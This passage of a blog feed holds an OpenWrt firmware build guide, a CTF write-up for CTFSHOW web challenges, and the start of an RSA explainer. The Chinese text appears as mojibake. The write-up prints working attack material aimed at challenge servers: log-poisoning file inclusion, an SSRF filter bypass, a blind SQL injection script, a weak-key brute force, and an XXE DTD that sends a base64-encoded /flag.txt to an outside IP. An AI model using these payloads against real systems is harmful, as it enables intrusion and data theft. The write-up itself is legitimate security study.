string">"MT7621"</span>Target Profileé€‰æ‹©<span class="token string">"Newifi D2"</span></code></pre><p>æˆ‘ä»¬å¸Œæœ›æœ‰webç•Œé¢ï¼Œè¿˜éœ€åœ¨<code>LuCI ---&gt; Collections</code>é€‰é¡¹ä¸­é€‰ä¸Š<code>luci</code></p><p>åœ¨<code>LuCI ---&gt; Applications</code>é€‰æ‹©è¦æ·»åŠ çš„æ’ä»¶åº”ç”¨ã€‚</p><p>åœ¨<code>LuCI ---&gt; Themes</code>ä¸­è®¾ç½®è¦å®‰è£…çš„ä¸»é¢˜ã€‚</p><p><code>make -j8 download v=s</code> ä¸‹è½½dlåº“</p><p>è¾“å…¥ <code>make -j1 V=s</code> ï¼ˆ<code>-j</code> åé¢çš„æ•°å­—1æ˜¯çº¿ç¨‹æ•°ã€‚ç¬¬ä¸€æ¬¡ç¼–è¯‘æ¨èç”¨å•çº¿ç¨‹ï¼‰å³å¯å¼€å§‹ç¼–è¯‘ä½ è¦çš„å›ºä»¶äº†ã€‚</p><p>ç¼–è¯‘å®Œæˆåè¾“å‡ºè·¯å¾„ï¼š<code>openwrt/bin/targets</code></p><p>ç¬¬äºŒæ¬¡ç¼–è¯‘ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> lede<span class="token function">git</span> pull./scripts/feeds update -a <span class="token operator">&amp;&amp;</span> ./scripts/feeds <span class="token function">install</span> -a<span class="token function">make</span> defconfig<span class="token function">make</span> -j8 download<span class="token function">make</span> -j<span class="token variable"><span class="token variable">$((</span>$<span class="token punctuation">(</span>nproc<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token variable">))</span></span> <span class="token assign-left variable">V</span><span class="token operator">=</span>s</code></pre><p>å¦‚æœéœ€è¦é‡æ–°é…ç½®ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> -rf ./tmp <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf .config<span class="token function">make</span> menuconfig<span class="token function">make</span> -j<span class="token variable"><span class="token variable">$((</span>$<span class="token punctuation">(</span>nproc<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token variable">))</span></span> <span class="token assign-left variable">V</span><span class="token operator">=</span>s</code></pre><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul><li><a href="https://cloud.tencent.com/developer/article/1614849">ç¼–è¯‘è‡ªå·±çš„openwrtå›ºä»¶ é™„ç¼–è¯‘å¥½çš„newifi3å›ºä»¶</a></li><li><a href="https://mianao.info/2020/03/01/è½»æ¾ç¼–è¯‘Openwrtå›ºä»¶æ”¯æŒV2rayå’ŒTrojan-ä¸Šç¯‡">è½»æ¾ç¼–è¯‘Openwrtå›ºä»¶æ”¯æŒV2rayå’ŒTrojan-ä¸Šç¯‡</a></li><li><a href="https://mianao.info/2020/03/02/%E8%BD%BB%E6%9D%BE%E7%BC%96%E8%AF%91Openwrt%E5%9B%BA%E4%BB%B6%E6%94%AF%E6%8C%81V2ray%E5%92%8CTrojan-%E4%B8%8B%E7%AF%87">è½»æ¾ç¼–è¯‘Openwrtå›ºä»¶æ”¯æŒV2rayå’ŒTrojan-ä¸‹ç¯‡</a></li><li><a href="https://mianao.info/2020/05/05/%E7%BC%96%E8%AF%91%E6%9B%B4%E6%96%B0OpenWrt-PassWall%E5%92%8CSSR-plus%E6%8F%92%E4%BB%B6">ç¼–è¯‘æ›´æ–°OpenWrt PassWallå’ŒSSR-plusæ’ä»¶</a></li><li><a href="https://github.com/kenzok8/openwrt-packages">openwrt-packages</a></li><li><a href="https://github.com/Lienol/openwrt">openwrt</a></li><li><a href="https://github.com/coolsnowwolf/lede">lede</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æœ¬æ–‡è®°å½•æˆ‘ï¼ˆçº¯å°ç™½ï¼‰è¿™å‡ å¤©æŠ˜è…¾è·¯ç”±å™¨çš„å¤§è‡´è¿‡ç¨‹ï¼Œå¤‡å¿˜ç”¨&lt;/p&gt;
&lt;h4 id=&quot;ç‰©è‰²è·¯ç”±å™¨&quot;&gt;&lt;a href=&quot;#ç‰©è‰²è·¯ç”±å™¨&quot; class=&quot;headerlink&quot; title=&quot;ç‰©è‰²è·¯ç”±å™¨&quot;&gt;&lt;/a&gt;ç‰©è‰²è·¯ç”±å™¨&lt;/h4&gt;&lt;p&gt;å› ä¸ºä»æ¥æ²¡ç©è¿‡ï¼Œè€Œä¸”å®¶é‡Œå¥½å‡ å¹´å‰çš„è·¯ç”±å™¨æ˜¯æ—¶å€™
      
    
    </summary>
    
    
      <category term="æ‚ä¸ƒæ‚å…«" scheme="https://www.extrader.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="æŠ˜è…¾" scheme="https://www.extrader.top/tags/%E6%8A%98%E8%85%BE/"/>
    
      <category term="è·¯ç”±å™¨" scheme="https://www.extrader.top/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW-WEB_AKèµ›</title>
    <link href="https://www.extrader.top/posts/f7521cf/"/>
    <id>https://www.extrader.top/posts/f7521cf/</id>
    <published>2020-08-03T13:10:31.000Z</published>
    <updated>2020-08-04T03:51:45.832Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨èœé¸¡çš„é“è·¯ä¸Šè¶Šèµ°è¶Šè¿œã€‚ã€‚ã€‚æ·¦ï¼</p><span id="more"></span><h3 id="ç­¾åˆ°-è§‚å·±"><a href="#ç­¾åˆ°-è§‚å·±" class="headerlink" title="ç­¾åˆ°_è§‚å·±"></a>ç­¾åˆ°_è§‚å·±</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>?file=/flag.txt</code>ç›´æ¥å‡ºç­”æ¡ˆã€‚ã€‚è¿™ç®—ä¸ªéé¢„æœŸè§£å§</p><p>å¦å¤–çš„è§£æ³•ï¼šæ–‡ä»¶åŒ…å«Nginxæ—¥å¿—æ–‡ä»¶ã€</p><p><code>?file=/var/log/nginx/access.log</code>å¯è¯»æ—¥å¿—æ–‡ä»¶å†…å®¹ï¼Œé‡Œé¢åŒ…å«ç”¨æˆ·è®¿é—®çš„UAä¿¡æ¯</p><p>äºæ˜¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200803211650015.png" alt loading="lazy"></p><p>å°è¯•å‘½ä»¤æ‰§è¡Œ</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AKèµ›/image-20200803211626102.png" alt="image-20200803211626102" loading="lazy"><p>éšå<code>cat /flag.txt</code>å³å¯</p><h3 id="Web1-è§‚å­—"><a href="#Web1-è§‚å­—" class="headerlink" title="Web1_è§‚å­—"></a>Web1_è§‚å­—</h3><p>é¢˜ç›®ç»™å‡ºæºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#flag in http://192.168.7.68/flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$protocol</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$protocol</span><span class="token operator">!=</span><span class="token string single-quoted-string">'http://'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ä»…é™httpåè®®è®¿é—®'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.|\;|\||\&lt;|\>|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\'|\"|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ä»…é™åŸŸååœ°å€è®¿é—®'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'curl '</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><code>payload</code>ï¼š<code>/?url=http://192ã€‚168ã€‚7ã€‚68/flag</code></p><p>åŸå› æ˜¯curlä¸­å¯ä»¥ç”¨<code>ã€‚</code>æ›¿æ¢<code>.</code></p><p>å¦å¤–ï¼Œipå¯ä»¥ä½¿ç”¨åè¿›åˆ¶è¿›è¡Œè®¿é—®ï¼Œå³<code>http://3232237380/flag</code>ï¼Œä½†é¢˜ç›®è¿‡æ»¤äº†0</p><h3 id="Web2-è§‚æ˜Ÿ"><a href="#Web2-è§‚æ˜Ÿ" class="headerlink" title="Web2_è§‚æ˜Ÿ"></a>Web2_è§‚æ˜Ÿ</h3><p>urlå¯ä»¥ç»™idä¼ å€¼ï¼Œå½“ä¼ å…¥ä¸€ä¸ªå¼•å·çš„æ—¶å€™å›æ˜¾<code>enheng?</code>ï¼Œæ¨æµ‹sqlæ³¨å…¥</p><p>FUZZæµ‹è¯•å‘ç°è¿‡æ»¤äº†ä»¥ä¸‹çš„å†…å®¹ï¼ˆé•¿åº¦ä¸º533çš„ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200801213125358.png" alt loading="lazy"></p><p>æœªè¿‡æ»¤<code>^</code>ï¼Œè€ƒè™‘å¸ƒå°”ç›²æ³¨</p><p>payloadï¼š</p><p><code>id=1^case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end.format(i,j)</code></p><p>è¿‡æ»¤äº†é€—å·ï¼Œ<code>if</code>æ— æ³•ä½¿ç”¨åˆ™ç”¨<code>case...when...then...else...end</code>ä»£æ›¿ç»•è¿‡ï¼Œ<code>substr</code>ä¸­çš„é€—å·ç”¨<code>substr(...from...for...)</code>ä»£æ›¿ç»•è¿‡</p><p>æ¥ä¸‹æ¥å°±å¯ä»¥å†™è„šæœ¬äº†</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://dc894a39-ba77-4e9f-9201-e52d7a19ba5c.chall.ctf.show/index.php?id=1^'</span><span class="token comment"># payload = 'case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'   web1</span><span class="token comment"># payload = 'case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database())))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'    flag,page,user</span><span class="token comment"># payload = 'case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp(0x666C6167)))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'    FLAG_COLUMN,flag</span>payload <span class="token operator">=</span> <span class="token string">'case(ord(substr((select(flag)from(flag))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        urls <span class="token operator">=</span> url<span class="token operator">+</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        request <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urls<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'I asked nothing'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h3 id="Web3-è§‚å›¾"><a href="#Web3-è§‚å›¾" class="headerlink" title="Web3_è§‚å›¾"></a>Web3_è§‚å›¾</h3><p>showImage.phpå¯çœ‹åˆ°æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//$key = substr(md5('ctfshow'.rand()),3,8);</span><span class="token comment">//flag in config.php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$image</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bf-ecb'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å›¾ç‰‡é“¾æ¥ä¸º<code>/showImage.php?image=Z6Ilu83MIDw=</code></p><p>å¯ä»¥çœ‹åˆ°å›¾ç‰‡æ–‡ä»¶åæ˜¯<code>Z6Ilu83MIDw=</code>ç»è¿‡<code>bf-ecb</code>ç®—æ³•ç”¨<code>$key</code>å¾—åˆ°çš„ï¼Œå†çœ‹<code>$key</code>çš„ç”Ÿæˆæ–¹å¼</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æŸ¥è¯¢<code>rand()</code>å‡½æ•°ï¼Œè‹¥é‡Œé¢çš„å‚æ•°ä¸ºç©ºï¼Œåˆ™è¿”å›<code>0</code>åˆ°<code>getrandmax()</code>ä¹‹é—´çš„ä¼ªéšæœºæ•´æ•°</p><p><code>getrandmax()</code>å‡½æ•°è¿”å›éšæœºæ•°å¯èƒ½è¿”å›çš„æœ€å¤§å€¼ï¼Œæ—¢ç„¶æœ‰ä¸Šé™å³å¯è¿›è¡Œçˆ†ç ´æ¥å¾—å‡º<code>key</code>å€¼</p><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">getrandmax</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//5a78dbb4</span>        <span class="token variable">$image</span><span class="token operator">=</span><span class="token string double-quoted-string">"Z6Ilu83MIDw="</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bf-ecb'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bf-ecb'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'5a78dbb4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å¾—åˆ°<code>N6bf8Bd8jm0SpmTZGl0isw==</code>ï¼Œä¸º<code>config.php</code>åŠ å¯†åçš„<code>base64</code>ç ï¼Œè®¿é—®<code>/showImage.php?image=N6bf8Bd8jm0SpmTZGl0isw==</code>ï¼ŒF12æ‰“å¼€å¤åˆ¶ä»£ç base64è§£å¯†å¾—åˆ°<code>config.php</code>çš„å†…å®¹ï¼Œ<code>flag</code>å³åœ¨å…¶ä¸­ã€‚</p><h3 id="Web4-è§‚å¿ƒ"><a href="#Web4-è§‚å¿ƒ" class="headerlink" title="Web4_è§‚å¿ƒ"></a>Web4_è§‚å¿ƒ</h3><p>æŠ“åŒ…å‘ç°æœ‰<code>api.php</code>æ–‡ä»¶ï¼Œå¹¶ä¸”å¸¦æœ‰è¯·æ±‚<code>api</code>å’Œ<code>city</code>ä¸¤ä¸ªæ•°æ®</p><p><code>api</code>æºå¸¦çš„æ˜¯ä¸€ä¸ªç½‘å€ï¼Œæ˜¯ä¸€ä¸ªxmlæ–‡ä»¶ï¼Œç”±æ­¤åˆ¤æ–­è€ƒçš„åº”è¯¥æ˜¯XXEå¤–éƒ¨å®ä½“æ³¨å…¥</p><p>äºæ˜¯æ„å»ºæ”»å‡»ç¯å¢ƒ</p><p>åœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šç¼–å†™ä¸¤ä¸ªæ–‡ä»¶</p><p>xxe.xml</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % dtd SYSTEM "http://ip/xxe.dtd">%dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>woojay<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">></span></span>password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>xxe.dtd</p><pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.106.160.176:5000&#x2F;%file;&#39;&gt;&quot;&gt;%int;%send;</code></pre><p>éšååœ¨æœåŠ¡å™¨ä¸Šç›‘å¬5000ç«¯å£ï¼Œå³å¯å¾—åˆ°<code>flag.txt</code>çš„ <code>base64</code>ç¼–ç åçš„ç»“æœï¼Œè§£ç æ—¢æ˜¯flag</p><p>ä¸ç›‘å¬ç«¯å£ä¹Ÿå¯ä»¥ï¼Œç›´æ¥å‘åŒ…è¯·æ±‚ï¼Œä¼šæŠŠæŠ¥é”™çš„ç»“æœè¿”å›ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200804113715125.png" alt loading="lazy"></p><p>XXEè¿™å—ä¸æ˜¯å¾ˆäº†è§£ï¼ŒåŸç†åé¢å†ä»”ç»†ç ”ç©¶ä¸€ä¸‹</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åœ¨èœé¸¡çš„é“è·¯ä¸Šè¶Šèµ°è¶Šè¿œã€‚ã€‚ã€‚æ·¦ï¼&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTFé¢˜" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>RSAç®—æ³•æµ…æ</title>
    <link href="https://www.extrader.top/posts/aa76c91b/"/>
    <id>https://www.extrader.top/posts/aa76c91b/</id>
    <published>2020-08-01T14:08:36.000Z</published>
    <updated>2020-08-11T13:13:09.922Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æ•°è®ºçŸ¥è¯†"><a href="#æ•°è®ºçŸ¥è¯†" class="headerlink" title="æ•°è®ºçŸ¥è¯†"></a>æ•°è®ºçŸ¥è¯†</h3><ol><li><p><strong>äº’è´¨</strong>ï¼šå¦‚æœä¸¤ä¸ªæ­£æ•´æ•°ï¼Œé™¤äº† 1 ä»¥å¤–æ²¡æœ‰å…¶ä»–çš„å…¬å› æ•°ï¼Œåˆ™ä»–ä»¬äº’è´¨ã€‚æ¯”å¦‚ï¼Œ14 å’Œ 15 äº’è´¨ã€‚æ³¨æ„ï¼Œä¸¤ä¸ªæ•°æ„æˆäº’è´¨å…³ç³»ï¼Œä»–ä»¬ä¸ä¸€å®šéœ€è¦æ˜¯è´¨æ•°ï¼Œæ¯”å¦‚ 7 å’Œ 9ã€‚</p></li><li><p><strong>æ¬§æ‹‰å‡½æ•°</strong>ï¼šç”¨äºè®¡ç®—ä»»æ„æ­£æ•´æ•° <code>n</code>ï¼Œåœ¨ <code>&lt;=n</code> çš„æ­£æ•´æ•°ä¸­ï¼Œä¸ <code>n</code> äº’è´¨çš„æ­£æ•´æ•°ä¸ªæ•°ã€‚</p></li><li><p><strong>æ¬§æ‹‰å®šç†</strong>ï¼šå¦‚æœä¸¤ä¸ªæ­£æ•´æ•° a å’Œ n äº’è´¨ï¼Œåˆ™å¦‚ä¸‹ç­‰å¼æˆç«‹ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801173237556.png" alt loading="lazy"></p></li><li><p><strong>è´¹é©¬å°å®šç†</strong>ï¼šæ¬§æ‹‰å‡½æ•°ä¸­çš„ä¸€ä¸ªç‰¹æ®Šæƒ…å†µï¼Œå¦‚æœ  <code>n</code>  æ˜¯è´¨æ•°ï¼Œè€Œ <code>a</code> ä¸æ˜¯ <code>n</code> çš„å€æ•°ï¼Œæ­¤æ—¶ <code>a</code> å’Œ <code>n</code> å¿…ç„¶äº’è´¨ã€‚å› ä¸º<code>n</code>çš„æ¬§æ‹‰å‡½æ•°å€¼ = <code>n-1</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801173548812.png" alt loading="lazy"></p></li><li><p><strong>æ¨¡åå…ƒç´ </strong>ï¼šå¦‚æœä¸¤ä¸ªæ­£æ•´æ•° <code>a</code> å’Œ <code>n</code> äº’è´¨ï¼Œé‚£ä¹ˆä¸€å®šå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ­£æ•´æ•° <code>b</code>ï¼Œä½¿å¾— <code>ab - 1</code> è¢« <code>n</code> æ•´é™¤ã€‚è¿™ä¸ªæ—¶å€™ï¼Œ<code>b</code> å°±å«åš <code>a</code> çš„ æ¨¡åå…ƒç´ ã€‚</p></li></ol><h3 id="å…³é”®å‚æ•°"><a href="#å…³é”®å‚æ•°" class="headerlink" title="å…³é”®å‚æ•°"></a>å…³é”®å‚æ•°</h3><p><code>(e,n)</code>ï¼šå…¬é’¥</p><p><code>(d,n)</code>ï¼šç§é’¥</p><p><code>p,q</code>ï¼š<code>n=p*q</code> ï¼Œ<code>p</code>å’Œ<code>q</code>éƒ½æ˜¯ä¸¤ä¸ªå¤§ç´ 